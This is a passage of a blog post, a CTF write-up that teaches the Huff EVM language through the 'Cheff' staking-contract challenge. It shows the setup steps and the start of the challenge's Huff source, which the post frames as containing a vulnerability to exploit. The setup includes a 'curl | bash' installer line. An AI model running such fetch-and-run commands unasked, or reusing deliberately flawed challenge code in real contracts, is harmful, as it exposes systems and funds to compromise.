<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Learn Huff by solving a CTF challenge
        
    </title><meta content="Learn Huff by solving a CTF challenge" property=og:title><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel=stylesheet><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><noscript><img src="https://themj0ln1r.goatcounter.com//count?p=/writings/learn-huff-with-ctf/&t=Learn Huff by solving a CTF challenge"></noscript><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
              tex: {
                inlineMath: [['$', '$'], ['\\(', '\\)']]
              }
            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/><b>TheMj0ln1r Blog</b></a><div class=socials></div></div><nav><a href=https://themj0ln1r.github.io/cv style=margin-left:.5em><b>CV</b></a><a href=https://themj0ln1r.github.io/archive style=margin-left:.5em><b>Archive</b></a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em><b>Tags</b></a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Learn Huff by solving a CTF challenge</div><div class=meta>Posted on <time>2025-12-14</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/web3/>web3</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/huff/>huff</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/evm/>evm</a> </span></div></div><div class=toc-container><h5 class=toc-title>Table of Contents</h5><ul class=toc-list><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#setup>Setup</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#understanding-cheff-huff>Understanding Cheff.huff</a> <ul><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#include-directives>Include Directives</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#interface-definitions>Interface Definitions</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#storage-slot-definitions>Storage Slot Definitions</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#constructor-macro>Constructor Macro</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#main-entry-point-and-function-dispatching>Main Entry Point and Function Dispatching</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#functions>Functions</a></li><ul><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#sushi-get-sushi-token-address>SUSHI() - Get Sushi Token Address</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#devaddr-get-developer-address>DEVADDR() - Get Developer Address</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#pool-length-get-total-number-of-pools>POOL_LENGTH() - Get Total Number of Pools</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#bonus-multiplier-get-bonus-multiplier-constant>BONUS_MULTIPLIER() - Get Bonus Multiplier Constant</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#player-get-player-address>PLAYER() - Get Player Address</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#is-solved-check-challenge-solution>IS_SOLVED() - Check Challenge Solution</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#get-multiplier-calculate-reward-multiplier>GET_MULTIPLIER() - Calculate Reward Multiplier</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#pool-info-get-pool-information>POOL_INFO() - Get Pool Information</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#user-info-get-user-staking-information>USER_INFO() - Get User Staking Information</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#add-add-new-pool>ADD() - Add New Pool</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#set-update-pool-allocation>SET() - Update Pool Allocation</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#set-migrator-set-migration-contract>SET_MIGRATOR() - Set Migration Contract</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#deposit-stake-lp-tokens>DEPOSIT() - Stake LP Tokens</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#withdraw-unstake-lp-tokens-and-claim-rewards>WITHDRAW() - Unstake LP Tokens and Claim Rewards</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#pending-sushi-calculate-pending-rewards>PENDING_SUSHI() - Calculate Pending Rewards</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#update-pool-update-single-pool>UPDATE_POOL() - Update Single Pool</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#migrate-migrate-lp-tokens>MIGRATE() - Migrate LP Tokens</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#dev-update-developer-address>DEV() - Update Developer Address</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#emergency-withdraw-emergency-lp-token-withdrawal>EMERGENCY_WITHDRAW() - Emergency LP Token Withdrawal</a></ul><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#cheff-contract-functionality-overview>Cheff Contract Functionality Overview</a></ul><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#breaking-the-cheff-huff>Breaking the Cheff.huff</a> <ul><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#challenge-goal>Challenge Goal</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#the-vulnerability>The Vulnerability</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#exploitation-strategy>Exploitation Strategy</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#attack-sequence>Attack Sequence</a></ul><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#the-exploit>The Exploit</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#conclusion>Conclusion</a><li><a href=https://themj0ln1r.github.io/writings/learn-huff-with-ctf/#references>References</a></ul></div><section class=body><p>Huff is a low-level programming language for writing highly optimized EVM smart contracts. High-level languages like Solidity and Vyper prioritize developer experience through abstraction, improving readability and reducing implementation complexity. These abstractions impose an optimization ceiling that prevents developers from achieving maximum gas efficiency. Yul, an intermediate language usable as inline assembly in Solidity or as standalone code, offers better optimization than Solidity but still cannot match direct opcode-level control. The Aztec Protocol team created Huff to implement <a href=https://github.com/aztecprotocol/weierstrudel/tree/master/huff_modules>Weierstrudel</a>, an on-chain elliptic curve arithmetic library requiring gas optimization beyond what existing languages could provide. In fact, Huff is not a new programming language for EVM, it is just a set of tools created to help developers to write smart contracts with pure EVM opcodes.<p>This writeup covers solving <code>Cheff</code>, a CTF challenge from the StateMind Fellowship CTF. The solution demonstrates Huff programming concepts through identifying and exploiting a vulnerability in the contract. This writeup assumes familiarity with EVM blockchain fundamentals, including calldata handling, memory management, and storage layout. Readers unfamiliar with these EVM internals can reference the linked writeups below that cover these concepts through practical challenges.<h2 id=setup>Setup</h2><p>Install the Huff compiler using <a href=https://docs.huff.sh/get-started/installing/>huffup</a>:<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>curl -L get.huff.sh </span><span style=color:#a71d5d;font-weight:700>| </span><span>bash
</span><span>huffup
</span></code></pre><p>Compile Huff contracts with the <code>huffc</code> command:<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>huffc contract.huff --bytecode
</span></code></pre><p>For detailed installation instructions, project structure, and advanced compilation options, refer to the <a href=https://docs.huff.sh/>official Huff documentation</a>.<p>Foundry supports Huff contract development through the <a href=https://github.com/huff-language/huff-project-template>huff-project-template</a>. Standard Foundry commands like <code>forge build</code> and <code>forge install</code> work within this template. Foundry cannot compile Huff contracts by default. The <a href=https://github.com/huff-language/foundry-huff>foundry-huff</a> library integrates <code>huffc</code> with Foundry's build system, requiring the Huff compiler to be installed. The template includes a SimpleStore example demonstrating the setup.<h2 id=understanding-cheff-huff>Understanding Cheff.huff</h2><p>The <code>Cheff.huff</code> contract below demonstrates key Huff concepts through line-by-line walkthrough. Each function includes side-by-side comparison with equivalent Solidity code to illustrate how Huff's low-level opcodes map to high-level constructs.<div class=note-container><button class=note-toggle><div class=note-icon><p>Cheff.huff</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/auth/Owned.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/utils/SafeTransferLib.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/math/SafeMath.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/auth/NonPayable.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/data-structures/Hashmap.huff</span><span>"
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>poolLength</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>add</span><span>(uint</span><span style=color:#0086b3>256</span><span> allocPoint, address lpToken, bool withUpdate) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>set</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, uint</span><span style=color:#0086b3>256</span><span> allocPoint, bool withUpdate) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>setMigrator</span><span>(address migrator) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>migrate</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>getMultiplier</span><span>(uint</span><span style=color:#0086b3>256</span><span> from, uint</span><span style=color:#0086b3>256</span><span> to) view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>pendingSushi</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, address user) view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>massUpdatePools</span><span>() nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>updatePool</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, uint</span><span style=color:#0086b3>256</span><span> amount) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, uint</span><span style=color:#0086b3>256</span><span> amount) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>emergencyWithdraw</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>dev</span><span>(address devaddr) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>sushi</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>devaddr</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>bonusEndBlock</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>sushiPerBlock</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>BONUS_MULTIPLIER</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>migrator</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>poolInfo</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) view </span><span style=color:#62a35c>returns</span><span> (address,uint256,uint256,uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>userInfo</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, address user) view </span><span style=color:#62a35c>returns</span><span> (uint256,uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>totalAllocPoint</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>startBlock</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>player</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() view </span><span style=color:#62a35c>returns</span><span> (bool)
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define event </span><span>Deposit(</span><span style=color:#a71d5d;font-weight:700>address indexed</span><span> user, </span><span style=color:#a71d5d;font-weight:700>uint256 indexed</span><span> pid, </span><span style=color:#a71d5d;font-weight:700>uint256</span><span> amount)
</span><span style=color:#a71d5d;font-weight:700>#define event </span><span>Withdraw(</span><span style=color:#a71d5d;font-weight:700>address indexed</span><span> user, </span><span style=color:#a71d5d;font-weight:700>uint256 indexed</span><span> pid, </span><span style=color:#a71d5d;font-weight:700>uint256</span><span> amount)
</span><span style=color:#a71d5d;font-weight:700>#define event </span><span>EmergencyWithdraw(</span><span style=color:#a71d5d;font-weight:700>address indexed</span><span> user, </span><span style=color:#a71d5d;font-weight:700>uint256 indexed</span><span> pid, </span><span style=color:#a71d5d;font-weight:700>uint256</span><span> amount)
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>Unauthorized()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>OutOfBounds()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>NoMigrator()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>CallFailed()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>ReturnDataSizeIsZero()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>BadMigrate()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>WithdrawNotGood()
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>BONUS_MULTIPLIER_CONSTANT</span><span> = </span><span style=color:#0086b3>0x0a
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>E</span><span> = </span><span style=color:#0086b3>0xe8d4a51000 
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>SUSHI_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>DEVADDR_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>BONUS_END_BLOCK_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()  
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>SUSHI_PER_BLOCK_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER() 
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>MIGRATOR_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>POOL_INFO_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>USER_INFO_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>TOTAL_ALLOC_POINT_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>START_BLOCK_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()  
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>PLAYER_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>CONSTRUCTOR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span>{
</span><span>    </span><span style=color:#62a35c>OWNED_CONSTRUCTOR</span><span>()
</span><span>    </span><span style=color:#0086b3>0xc0 0xe0 </span><span style=color:#a71d5d;font-weight:700>codesize sub
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>codecopy
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#0086b3>0x40 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#0086b3>0x60 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#0086b3>[START_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#0086b3>0x80 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#0086b3>[BONUS_END_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#0086b3>0xa0 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#0086b3>[PLAYER_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#0086b3>0x68 </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>    </span><span style=color:#a71d5d;font-weight:700>codesize sub
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 swap2
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>codecopy
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MAIN</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>NON_PAYABLE</span><span>()
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>calldataload </span><span style=color:#0086b3>0xe0 </span><span style=color:#a71d5d;font-weight:700>shr
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(poolLength)            </span><span style=color:#a71d5d;font-weight:700>eq </span><span>pool_length_jump                  </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(</span><span style=color:#a71d5d;font-weight:700>add</span><span>)                   </span><span style=color:#a71d5d;font-weight:700>eq </span><span>add_jump                          </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(set)                   </span><span style=color:#a71d5d;font-weight:700>eq </span><span>set_jump                          </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(setMigrator)           </span><span style=color:#a71d5d;font-weight:700>eq </span><span>set_migrator_jump                 </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(migrate)               </span><span style=color:#a71d5d;font-weight:700>eq </span><span>migrate_jump                      </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(getMultiplier)         </span><span style=color:#a71d5d;font-weight:700>eq </span><span>get_multiplier_jump               </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(pendingSushi)          </span><span style=color:#a71d5d;font-weight:700>eq </span><span>pending_sushi_jump                </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(massUpdatePools)       </span><span style=color:#a71d5d;font-weight:700>eq </span><span>mass_update_pools_jump            </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(updatePool)            </span><span style=color:#a71d5d;font-weight:700>eq </span><span>update_pool_jump                  </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(deposit)               </span><span style=color:#a71d5d;font-weight:700>eq </span><span>deposit_jump                      </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(withdraw)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>withdraw_jump                     </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(emergencyWithdraw)     </span><span style=color:#a71d5d;font-weight:700>eq </span><span>emergency_withdraw_jump           </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(dev)                   </span><span style=color:#a71d5d;font-weight:700>eq </span><span>dev_jump                          </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(sushi)                 </span><span style=color:#a71d5d;font-weight:700>eq </span><span>sushi_jump                        </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(devaddr)               </span><span style=color:#a71d5d;font-weight:700>eq </span><span>devaddr_jump                      </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(bonusEndBlock)         </span><span style=color:#a71d5d;font-weight:700>eq </span><span>bonus_end_block_jump              </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(sushiPerBlock)         </span><span style=color:#a71d5d;font-weight:700>eq </span><span>sushi_per_block_jump              </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(BONUS_MULTIPLIER)      </span><span style=color:#a71d5d;font-weight:700>eq </span><span>bonus_multiplier_jump             </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(migrator)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>migrator_jump                     </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(poolInfo)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>pool_info_jump                    </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(userInfo)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>user_info_jump                    </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(totalAllocPoint)       </span><span style=color:#a71d5d;font-weight:700>eq </span><span>total_alloc_point_jump            </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(startBlock)            </span><span style=color:#a71d5d;font-weight:700>eq </span><span>start_block_jump                  </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(player)                </span><span style=color:#a71d5d;font-weight:700>eq </span><span>player_jump                       </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(isSolved)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>is_solved_jump                    </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#62a35c>OWNED_MAIN</span><span>()
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>dup1 revert
</span><span>    pool_length_jump:
</span><span>        </span><span style=color:#62a35c>POOL_LENGTH</span><span>()
</span><span>    add_jump:
</span><span>        </span><span style=color:#62a35c>ADD</span><span>()
</span><span>    set_jump:
</span><span>        </span><span style=color:#62a35c>SET</span><span>()
</span><span>    set_migrator_jump:
</span><span>        </span><span style=color:#62a35c>SET_MIGRATOR</span><span>()
</span><span>    migrate_jump:
</span><span>        </span><span style=color:#62a35c>MIGRATE</span><span>()
</span><span>    get_multiplier_jump:
</span><span>        </span><span style=color:#62a35c>GET_MULTIPLIER</span><span>()
</span><span>    pending_sushi_jump:
</span><span>        </span><span style=color:#62a35c>PENDING_SUSHI</span><span>()
</span><span>    mass_update_pools_jump:
</span><span>        </span><span style=color:#62a35c>MASS_UPDATE_POOLS</span><span>()
</span><span>    update_pool_jump:
</span><span>        </span><span style=color:#62a35c>UPDATE_POOL</span><span>()
</span><span>    deposit_jump:
</span><span>        </span><span style=color:#62a35c>DEPOSIT</span><span>()
</span><span>    withdraw_jump:
</span><span>        </span><span style=color:#62a35c>WITHDRAW</span><span>()
</span><span>    emergency_withdraw_jump:
</span><span>        </span><span style=color:#62a35c>EMERGENCY_WITHDRAW</span><span>()
